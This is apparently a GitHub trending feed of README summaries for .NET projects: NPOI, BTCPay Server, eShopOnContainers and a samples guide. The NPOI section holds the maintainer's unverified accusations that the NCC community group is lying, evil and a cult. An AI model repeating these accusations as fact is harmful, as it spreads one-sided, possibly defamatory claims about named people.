&lt;p&gt;Go to the sample folder and build to check for errors:&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;dotnet build&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Run your sample:&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;dotnet run&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Add a &lt;em&gt;README.md&lt;/em&gt; to the root directory of your sample.&lt;/p&gt; &lt;p&gt;This should include a brief description of the code, and refer people to the article that references the sample.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt;</summary>
  </entry>
  <entry>
    <title>nissl-lab/npoi</title>
    <updated>2022-05-29T01:36:31Z</updated>
    <id>tag:github.com,2022-05-29:/nissl-lab/npoi</id>
    <link href="https://github.com/nissl-lab/npoi" rel="alternate"></link>
    <summary type="html">&lt;p&gt;a .NET library that can read/write Office formats without Microsoft Office installed. No COM+, no interop.&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Statement about Russian Invasion War&lt;/h2&gt; &#xA;&lt;p&gt;This project fully supports Ukraine people to fight against Russian army. This is definitely an invasion. Ukraine are actually China&#39;s friend for a long time. Most core parts of China aircraft carrier, airplane are provided by Ukraine companies. I DON&#39;T see any reason that we should support Russia instead Ukraine.&lt;/p&gt; &#xA;&lt;p&gt;However, I don&#39;t wanna stop Russian developers from using NPOI. They are also victims. They cannot change Putin&#39;s or Russia Government&#39;s mind in any case. But if possible, Russian developers may help impact your government although it&#39;s risky. Thank you!&lt;/p&gt; &#xA;&lt;h1&gt;NPOI&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.nuget.org/packages/NPOI&#34;&gt;&lt;img src=&#34;https://buildstats.info/nuget/NPOI&#34; alt=&#34;NuGet Badge&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://ko-fi.com/tonyqus&#34;&gt;&lt;img src=&#34;https://img.shields.io/static/v1?style=flat-square&amp;amp;message=Support%20the%20Project&amp;amp;color=success&amp;amp;style=plastic&amp;amp;logo=ko-fi&amp;amp;label=$$&#34; alt=&#34;Ko-Fi&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://raw.githubusercontent.com/nissl-lab/npoi/master/License.md&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/License-Apache%202.0-blue.svg?style=flat-square&amp;amp;logo=Apache&#34; alt=&#34;License&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://raw.githubusercontent.com/nissl-lab/npoi/master/#&#34;&gt;&lt;img src=&#34;https://api.segment.io/v1/pixel/track?data=ewogICJ3cml0ZUtleSI6ICJBV2NjaWd1UkhKODBuNkJ4WlI4cHRaRzBINzY0RmJObCIsCiAgInVzZXJJZCI6ICJ0b255cXVzIiwKICAiZXZlbnQiOiAiTlBPSSBIb21lcGFnZSIKfQ==&#34; alt=&#34;traffic&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/nissl-lab/npoi/graphs/contributors&#34;&gt; &lt;img src=&#34;https://img.shields.io/github/contributors/nissl-lab/npoi?logo=github&amp;amp;label=contributors&#34; alt=&#34;GitHub contributors&#34;&gt; &lt;/a&gt; &lt;br&gt; This project is the .NET version of POI Java project. With NPOI, you can read/write Office 2003/2007 files very easily.&lt;br&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/nissl-lab/npoi/issues/705&#34;&gt;Who is using NPOI?&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Telegram User Group&lt;/h1&gt; &#xA;&lt;p&gt;Join us on telegram: &lt;a href=&#34;https://t.me/npoidevs&#34;&gt;https://t.me/npoidevs&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;NOTE: QQ or wechat is not recommended.&lt;/p&gt; &#xA;&lt;h1&gt;Get Started with NPOI&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/nissl-lab/npoi/wiki/Getting-Started-with-NPOI&#34;&gt;Getting Started with NPOI&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/nissl-lab/npoi/wiki/How-to-use-NPOI-on-Linux&#34;&gt;How to use NPOI on Linux&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/nissl-lab/npoi/wiki/ORM-on-NPOI&#34;&gt;ORM on NPOI&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/nissl-lab/npoi/wiki/Changelog&#34;&gt;NPOI Changelog&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Replace DotnetCore.NPOI with NPOI ASAP&lt;/h1&gt; &#xA;&lt;p&gt;NPOI NEVER joins China NCC (.NET Core Community) group. They are cheating. The readme.md in Dotnetcore.npoi repo is full of lies. What they want to do is just to destory NPOI since they cannot make use of reputation of this component any more. That&#39;s why I&#39;m always saying they are evil. The whole NCC group is evil.&lt;/p&gt; &#xA;&lt;p&gt;NPOI从未加入过中国NCC开源组织，他们在欺骗公众！Dotnetcore.npoi的readme.md完全是诽谤，一堆谎言。他们想做的无非就是想毁掉NPOI，因为他们不能再用NPOI来行骗了。这也是我为什么一直说他们很邪恶，整个NCC组织就是一个邪教。&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://tonyqus.medium.com/stop-using-dotnetcore-npoi-nuget-package-its-too-obsolete-6d0aeedb3319&#34;&gt;Stop using Dotnetcore/NPOI nuget package. It’s obsolete!&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://tonyqus.medium.com/the-real-history-of-dotnetcore-npoi-999bb5e140c7&#34;&gt;The real history of Dotnetcore.NPOI&lt;/a&gt; &lt;a href=&#34;https://zhuanlan.zhihu.com/p/506975972&#34;&gt;中文版&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Advantage of NPOI&lt;/h1&gt; &#xA;&lt;p&gt;a. It&#39;s totally free to use&lt;/p&gt; &#xA;&lt;p&gt;b. Cover most features of Excel (cell style, data format, formula and so on)&lt;/p&gt; &#xA;&lt;p&gt;c. Supported formats: xls, xlsx, docx.&lt;/p&gt; &#xA;&lt;p&gt;d. Designed to be interface-oriented (take a look at NPOI.SS namespace)&lt;/p&gt; &#xA;&lt;p&gt;e. Support not only export but also import&lt;/p&gt; &#xA;&lt;p&gt;f. Real successful cases all over the world&lt;/p&gt; &#xA;&lt;p&gt;g. &lt;a href=&#34;https://github.com/nissl-lab/npoi-examples&#34;&gt;huge amount of basic examples&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;h. Works on both Windows and Linux&lt;/p&gt; &#xA;&lt;h1&gt;System Requirement&lt;/h1&gt; &#xA;&lt;p&gt;.NET Standard 2.1 (.NET Core 3.x)&lt;/p&gt; &#xA;&lt;p&gt;.NET Standard 2.0 (.NET Core 2.x)&lt;/p&gt; &#xA;&lt;p&gt;.NET Framework 4.0 and above&lt;/p&gt; &#xA;&lt;p&gt;No Loongson CPU (NPOI will NOT support any issues running on LoognArch architecture. This CPU is a shit)&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>btcpayserver/btcpayserver</title>
    <updated>2022-05-29T01:36:31Z</updated>
    <id>tag:github.com,2022-05-29:/btcpayserver/btcpayserver</id>
    <link href="https://github.com/btcpayserver/btcpayserver" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Accept Bitcoin payments. Free, open-source &amp; self-hosted, Bitcoin payment processor.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;BTCPay Server&lt;/h1&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/btcpayserver/btcpayserver/master/BTCPayServer/wwwroot/img/btc_pay_BG_twitter.png&#34; alt=&#34;BTCPay Server&#34;&gt;&lt;/p&gt; &#xA;&lt;h3 align=&#34;center&#34;&gt; Accept Bitcoin payments ₿ &lt;/h3&gt; &#xA;&lt;p align=&#34;center&#34;&gt; BTCPay Server is a free and open-source Bitcoin payment processor which allows you to accept bitcoin without fees or intermediaries. &lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://circleci.com/gh/btcpayserver/btcpayserver&#34;&gt; &lt;img src=&#34;https://img.shields.io/circleci/build/github/btcpayserver/btcpayserver&#34;&gt; &lt;/a&gt; &lt;a href=&#34;https://github.com/btcpayserver/btcpayserver/releases/&#34;&gt; &lt;img src=&#34;https://img.shields.io/github/v/release/btcpayserver/btcpayserver&#34;&gt; &lt;/a&gt; &lt;a href=&#34;https://github.com/btcpayserver/btcpayserver/raw/master/LICENSE&#34;&gt; &lt;img src=&#34;https://img.shields.io/github/license/btcpayserver/btcpayserver&#34;&gt; &lt;/a&gt; &lt;a href=&#34;https://docs.btcpayserver.org/Contribute/&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/PRs-welcome-brightgreen.svg?sanitize=true&#34;&gt; &lt;/a&gt; &lt;a href=&#34;https://chat.btcpayserver.org/&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/Community%20Chat-Mattermost-%230058cc&#34;&gt; &lt;/a&gt; &lt;a href=&#34;https://twitter.com/intent/follow?screen_name=btcpayserver&#34;&gt; &lt;img src=&#34;https://img.shields.io/twitter/follow/btcpayserver.svg?label=Follow%20@btcpayserver&#34;&gt; &lt;/a&gt; &lt;/p&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;h3&gt; &lt;a href=&#34;https://btcpayserver.org&#34;&gt; Website &lt;/a&gt; &lt;span&gt; | &lt;/span&gt; &lt;a href=&#34;https://docs.btcpayserver.org&#34;&gt; Documentation &lt;/a&gt; &lt;span&gt; | &lt;/span&gt; &lt;a href=&#34;https://docs.btcpayserver.org/API/Greenfield/v1/&#34;&gt; API &lt;/a&gt; &lt;span&gt; | &lt;/span&gt; &lt;a href=&#34;https://docs.btcpayserver.org/Contribute/&#34;&gt; Contribute &lt;/a&gt; &lt;span&gt; | &lt;/span&gt; &lt;a href=&#34;https://www.youtube.com/btcpayserver/&#34;&gt; YouTube &lt;/a&gt; &lt;span&gt; | &lt;/span&gt; &lt;a href=&#34;https://chat.btcpayserver.org/&#34;&gt; Chat &lt;/a&gt; &lt;/h3&gt; &#xA;&lt;/div&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;sub&gt;&#34;This is lies, my trust in you is broken, I will make you obsolete&#34; 💚  &lt;/sub&gt;&#xA;&lt;/div&gt; &#xA;&lt;br&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://mainnet.demo.btcpayserver.org&#34;&gt;View Demo&lt;/a&gt; · &lt;a href=&#34;https://github.com/btcpayserver/btcpayserver/issues/new/choose&#34;&gt;Report a bug&lt;/a&gt; · &lt;a href=&#34;https://github.com/btcpayserver/btcpayserver/discussions/new&#34;&gt;Request a feature&lt;/a&gt; · &lt;a href=&#34;https://docs.btcpayserver.org/FAQ/&#34;&gt;FAQ&lt;/a&gt; &lt;/p&gt; &#xA;&lt;h2&gt;💼 Table of Contents&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/btcpayserver/btcpayserver/master/#-features&#34;&gt;Features&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/btcpayserver/btcpayserver/master/#-getting-started&#34;&gt;Getting Started&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/btcpayserver/btcpayserver/master/#-documentation&#34;&gt;Documentation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/btcpayserver/btcpayserver/master/#-contributing&#34;&gt;Contributing&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/btcpayserver/btcpayserver/master/#-developing&#34;&gt;Developing&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/btcpayserver/btcpayserver/master/#-api&#34;&gt;API&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/btcpayserver/btcpayserver/master/#-community&#34;&gt;Community&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/btcpayserver/btcpayserver/master/#-license&#34;&gt;License&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/btcpayserver/btcpayserver/master/#-supporters&#34;&gt;Supporters&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/btcpayserver/btcpayserver-doc/master/docs/img/BTCPayServerScreenshot.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;🎨 Features&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Direct, peer-to-peer Bitcoin payments&lt;/li&gt; &#xA; &lt;li&gt;No transaction fees (other than the &lt;a href=&#34;https://en.bitcoin.it/wiki/Miner_fees&#34;&gt;network fee&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;No fees, middleman or KYC&lt;/li&gt; &#xA; &lt;li&gt;Non-custodial (complete control over the private key)&lt;/li&gt; &#xA; &lt;li&gt;Enhanced privacy &amp;amp; security&lt;/li&gt; &#xA; &lt;li&gt;Self-hosted&lt;/li&gt; &#xA; &lt;li&gt;SegWit support&lt;/li&gt; &#xA; &lt;li&gt;Lightning Network support (LND, c-lightning, Eclair, and Ptarmigan)&lt;/li&gt; &#xA; &lt;li&gt;Tor support&lt;/li&gt; &#xA; &lt;li&gt;Share your instance with friends (multi-tenant)&lt;/li&gt; &#xA; &lt;li&gt;Invoice management and Payment requests&lt;/li&gt; &#xA; &lt;li&gt;Apps: Point of sale, crowdfunding, donation button&lt;/li&gt; &#xA; &lt;li&gt;Full-node reliant wallet with &lt;a href=&#34;https://docs.btcpayserver.org/Vault/&#34;&gt;hardware wallet integration&lt;/a&gt; and SegWit support&lt;/li&gt; &#xA; &lt;li&gt;Bitcoin-only build, separate community-maintained altcoin build (&lt;a href=&#34;https://docs.btcpayserver.org/FAQ/FAQ-Altcoin/&#34;&gt;supported altcoins&lt;/a&gt;)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;🚀 Getting Started&lt;/h2&gt; &#xA;&lt;p&gt;Firstly, decide if you want to host an instance yourself or use a &lt;a href=&#34;https://docs.btcpayserver.org/ThirdPartyHosting/&#34;&gt;third-party host&lt;/a&gt;. If you&#39;ve chosen to self-host, there are plenty of documented &lt;a href=&#34;https://docs.btcpayserver.org/Deployment/&#34;&gt;ways to deploy BTCPay Server&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;After successful deployment, make sure to check our &lt;a href=&#34;https://docs.btcpayserver.org/RegisterAccount/&#34;&gt;getting started&lt;/a&gt; and &lt;a href=&#34;https://docs.btcpayserver.org/Walkthrough/&#34;&gt;walkthrough&lt;/a&gt; guides. In case you would like to use Lightning Network, see &lt;a href=&#34;https://docs.btcpayserver.org/LightningNetwork/&#34;&gt;Lightning guide&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;📗 Documentation&lt;/h2&gt; &#xA;&lt;p&gt;Please check out our &lt;a href=&#34;https://btcpayserver.org/&#34;&gt;official website&lt;/a&gt;, &lt;a href=&#34;https://docs.btcpayserver.org/&#34;&gt;complete documentation&lt;/a&gt; and &lt;a href=&#34;https://docs.btcpayserver.org/FAQ/&#34;&gt;FAQ&lt;/a&gt; for more details.&lt;/p&gt; &#xA;&lt;p&gt;If you have trouble using BTCPay Server, consider joining &lt;a href=&#34;https://btcpayserver.org/#communityCTA&#34;&gt;communities listed on the official website&lt;/a&gt; to get help from other contributors. Only create a &lt;a href=&#34;https://github.com/btcpayserver/btcpayserver/issues/new/choose&#34;&gt;GitHub issue&lt;/a&gt; for technical issues you can&#39;t resolve through other channels or feature requests you&#39;ve validated with other members of the community.&lt;/p&gt; &#xA;&lt;h2&gt;🤝 Contributing&lt;/h2&gt; &#xA;&lt;p&gt;BTCPay Server is built and maintained entirely by volunteer contributors around the internet. We welcome and appreciate new contributions.&lt;/p&gt; &#xA;&lt;p&gt;If you&#39;re a developer looking to help, but you&#39;re not sure where to begin, check the &lt;a href=&#34;https://github.com/btcpayserver/btcpayserver/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22&#34;&gt;good first issue label&lt;/a&gt;, which contains small pieces of work that have been specifically flagged as being friendly to new contributors.&lt;/p&gt; &#xA;&lt;p&gt;Contributors looking to do something a bit more challenging, before opening a pull request, please join &lt;a href=&#34;https://chat.btcpayserver.org/&#34;&gt;our community chat&lt;/a&gt; or &lt;a href=&#34;https://github.com/btcpayserver/btcpayserver/discussions&#34;&gt;start a GitHub discussion&lt;/a&gt; to get early feedback, discuss best ways to tackle the problem and ensure there is no work duplication.&lt;/p&gt; &#xA;&lt;p&gt;There are many other ways to get involved with the project. Check our &lt;a href=&#34;https://docs.btcpayserver.org/Contribute/&#34;&gt;contribution guidelines&lt;/a&gt;. To get the big-picture of the project development, visit our &lt;a href=&#34;https://github.com/orgs/btcpayserver/projects/9&#34;&gt;evolving roadmap&lt;/a&gt;. We organize different types of community calls several times a month. &lt;a href=&#34;https://github.com/btcpayserver/organization#calendar&#34;&gt;Subscribe to our calendar&lt;/a&gt; and feel free to join our calls to discuss development, design, documentation and more.&lt;/p&gt; &#xA;&lt;h2&gt;🧑‍💻 Developing&lt;/h2&gt; &#xA;&lt;p&gt;To begin developing locally, visit our &lt;a href=&#34;https://docs.btcpayserver.org/Development/LocalDevelopment/&#34;&gt;local development guide&lt;/a&gt;. There are also several video-tutorials:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=ZePbMPSIvHM&#34;&gt;Setting up development environment on Windows&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=j486T_Rk-yw&amp;amp;t&#34;&gt;Setting up development environment Linux (Ubuntu)&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=GWR_CcMsEV0&#34;&gt;Setting up development environment MacOS&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;How to build&lt;/h3&gt; &#xA;&lt;p&gt;While the documentation advises using docker-compose, you may want to build BTCPay Server yourself.&lt;/p&gt; &#xA;&lt;p&gt;First, install .NET Core SDK v6.0 as specified by the &lt;a href=&#34;https://dotnet.microsoft.com/download/dotnet-core/6.0&#34;&gt;Microsoft website&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;On Powershell:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;.\build.ps1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;On linux:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;./build.sh&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;How to run&lt;/h3&gt; &#xA;&lt;p&gt;Use the &lt;code&gt;run&lt;/code&gt; scripts to run BTCPay Server, this example shows how to print the available command-line arguments of BTCPay Server.&lt;/p&gt; &#xA;&lt;p&gt;On Powershell:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;.\run.ps1 --help&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;On linux:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;./run.sh --help&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;How to debug&lt;/h3&gt; &#xA;&lt;p&gt;If you want to debug, use Visual Studio Code or Visual Studio 2019.&lt;/p&gt; &#xA;&lt;p&gt;You need to run the development time docker-compose as described &lt;a href=&#34;https://raw.githubusercontent.com/btcpayserver/btcpayserver/master/BTCPayServer.Tests/README.md&#34;&gt;in the test guide&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;You can then run the debugger by using the Launch Profile &lt;code&gt;Docker-Regtest&lt;/code&gt; on either Visual Studio Code or Visual Studio 2017.&lt;/p&gt; &#xA;&lt;p&gt;If you need to debug ledger wallet interaction, install the development time certificate with:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Install development time certificate in the trust store&#xA;dotnet dev-certs https --trust&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then use the &lt;code&gt;Docker-Regtest-https&lt;/code&gt; debug profile.&lt;/p&gt; &#xA;&lt;h3&gt;Other dependencies&lt;/h3&gt; &#xA;&lt;p&gt;For more information, see the documentation: &lt;a href=&#34;https://docs.btcpayserver.org/Deployment/&#34;&gt;How to deploy a BTCPay Server instance&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;🧪 API&lt;/h3&gt; &#xA;&lt;p&gt;BTCPay Server has two APIs:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Greenfield API (New)&lt;/strong&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://docs.btcpayserver.org/API/Greenfield/v1/&#34;&gt;Greenfield API documentation&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://docs.btcpayserver.org/GreenFieldExample/&#34;&gt;Greenfield API examples with CURL&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Legacy API&lt;/strong&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;The &lt;strong&gt;Greenfield API&lt;/strong&gt; is our brand-new API which is still in development. Once complete, it will allow you to run BTCPay Server headlessly. The &lt;strong&gt;Legacy API&lt;/strong&gt;, is fully compatible with &lt;a href=&#34;https://bitpay.com/api/&#34;&gt;BitPay&#39;s API&lt;/a&gt;. It has limited features, but allows instant migration from BitPay.&lt;/p&gt; &#xA;&lt;h2&gt;💚 Community&lt;/h2&gt; &#xA;&lt;p&gt;Our community is the ❤️ of the project. To chat with other community members in real-time, join our &lt;a href=&#34;https://chat.btcpayserver.org&#34;&gt;Mattermost chat&lt;/a&gt;. We&#39;re also on &lt;a href=&#34;https://github.com/btcpayserver/btcpayserver/discussions&#34;&gt;GitHub discussions&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;📝 License&lt;/h2&gt; &#xA;&lt;p&gt;BTCPay Server software, logo and designs are provided under &lt;a href=&#34;https://github.com/btcpayserver/btcpayserver/raw/master/LICENSE&#34;&gt;MIT License&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;🙏 Supporters&lt;/h2&gt; &#xA;&lt;p&gt;The BTCPay Server Project is proudly supported by these entities through the &lt;a href=&#34;https://foundation.btcpayserver.org/&#34;&gt;BTCPay Server Foundation&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34; valign=&#34;middle&#34;&gt; &lt;a href=&#34;https://spiral.xyz&#34; target=&#34;_blank&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/btcpayserver/btcpayserver/master/BTCPayServer/wwwroot/img/spiral.svg?sanitize=true&#34; alt=&#34;Spiral&#34; height=&#34;100&#34;&gt; &lt;br&gt; &lt;span&gt;Spiral&lt;/span&gt; &lt;/a&gt; &lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34; valign=&#34;middle&#34;&gt; &lt;a href=&#34;https://www.bailliegifford.com&#34; target=&#34;_blank&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/btcpayserver/btcpayserver/master/BTCPayServer/wwwroot/img/bailliegifford.svg?sanitize=true&#34; alt=&#34;bailliegifford&#34; height=&#34;100&#34;&gt; &lt;br&gt; &lt;span&gt;Baillie Gifford&lt;/span&gt; &lt;/a&gt; &lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34; valign=&#34;middle&#34;&gt; &lt;a href=&#34;https://www.pnxbet.com&#34; target=&#34;_blank&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/btcpayserver/btcpayserver/master/BTCPayServer/wwwroot/img/pnxbet.png&#34; alt=&#34;PNXBET&#34; height=&#34;100&#34;&gt; &lt;br&gt; &lt;span&gt;PNXBET&lt;/span&gt; &lt;/a&gt; &lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34; valign=&#34;middle&#34;&gt; &lt;a href=&#34;https://lunanode.com&#34; target=&#34;_blank&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/btcpayserver/btcpayserver/master/BTCPayServer/wwwroot/img/lunanode.svg?sanitize=true&#34; alt=&#34;LunaNode&#34; height=&#34;100&#34;&gt; &lt;br&gt; &lt;span&gt;LunaNode&lt;/span&gt; &lt;/a&gt; &lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34; valign=&#34;middle&#34;&gt; &lt;a href=&#34;https://walletofsatoshi.com/&#34; target=&#34;_blank&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/btcpayserver/btcpayserver/master/BTCPayServer/wwwroot/img/walletofsatoshi.svg?sanitize=true&#34; alt=&#34;Wallet of Satoshi&#34; height=&#34;100&#34;&gt; &lt;br&gt; &lt;span&gt;Wallet of Satoshi&lt;/span&gt; &lt;/a&gt; &lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34; valign=&#34;middle&#34;&gt; &lt;a href=&#34;https://nomics.com/&#34; target=&#34;_blank&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/btcpayserver/btcpayserver/master/BTCPayServer/wwwroot/img/nomics.svg?sanitize=true&#34; alt=&#34;Nomics&#34; height=&#34;100&#34;&gt; &lt;br&gt; &lt;span&gt;Nomics&lt;/span&gt; &lt;/a&gt; &lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34; valign=&#34;middle&#34;&gt; &lt;a href=&#34;https://coincards.com/&#34; target=&#34;_blank&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/btcpayserver/btcpayserver/master/BTCPayServer/wwwroot/img/coincards.svg?sanitize=true&#34; alt=&#34;Coincards&#34; height=&#34;100&#34;&gt; &lt;br&gt; &lt;span&gt;Coincards&lt;/span&gt; &lt;/a&gt; &lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34; valign=&#34;middle&#34;&gt; &lt;a href=&#34;https://ivpn.net/&#34; target=&#34;_blank&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/btcpayserver/btcpayserver/master/BTCPayServer/wwwroot/img/ivpn.svg?sanitize=true&#34; alt=&#34;IVPN&#34; height=&#34;100&#34;&gt; &lt;br&gt; &lt;span&gt;IVPN&lt;/span&gt; &lt;/a&gt; &lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;If you&#39;d like to support the project, please visit the &lt;a href=&#34;https://btcpayserver.org/donate/&#34;&gt;donation page&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>dotnet-architecture/eShopOnContainers</title>
    <updated>2022-05-29T01:36:31Z</updated>
    <id>tag:github.com,2022-05-29:/dotnet-architecture/eShopOnContainers</id>
    <link href="https://github.com/dotnet-architecture/eShopOnContainers" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Cross-platform .NET sample microservices and container based application that runs on Linux Windows and macOS. Powered by .NET 6, Docker Containers and Azure Kubernetes Services. Supports Visual Studio, VS for Mac and CLI based environments with Docker CLI, dotnet CLI, VS Code or any other code editor.&lt;/p&gt;&lt;hr&gt;&lt;a href=&#34;https://dot.net/architecture&#34;&gt; &lt;img src=&#34;https://github.com/dotnet-architecture/eShopOnContainers/raw/dev/img/eshop_logo.png&#34; alt=&#34;eShop logo&#34; title=&#34;eShopOnContainers&#34; align=&#34;right&#34; height=&#34;60&#34;&gt; &lt;/a&gt; &#xA;&lt;h1&gt;.NET Microservices Sample Reference Application&lt;/h1&gt; &#xA;&lt;p&gt;Sample .NET Core reference application, powered by Microsoft, based on a simplified microservices architecture and Docker containers.&lt;/p&gt; &#xA;&lt;h2&gt;SPA Application (Angular)&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/dotnet-architecture/eShopOnContainers/dev/img/eshop-spa-app-home.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Build Status (GitHub Actions)&lt;/h2&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Image&lt;/th&gt; &#xA;   &lt;th&gt;Status&lt;/th&gt; &#xA;   &lt;th&gt;Image&lt;/th&gt; &#xA;   &lt;th&gt;Status&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Web 